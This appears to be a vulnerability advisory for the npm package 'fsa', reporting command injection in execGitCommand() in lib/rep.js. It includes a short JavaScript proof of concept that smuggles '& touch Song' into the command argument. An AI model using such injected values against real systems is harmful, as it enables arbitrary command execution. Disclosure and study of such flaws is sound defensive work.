# Overview
`fsa` is a File system auditor, this package are vulnerable to Command Injection.
\
The first argument of `execGitCommand()`, located within `lib/rep.js#63` can be controlled by users without any sanitization to inject arbitrary commands.

# Proof of Concept
```
var root = require("fsa");
var attack_code = "& touch Song";
var dir = "./";
var options= {};
root.rep.execGitCommand(attack_code,dir,options,function(){});
```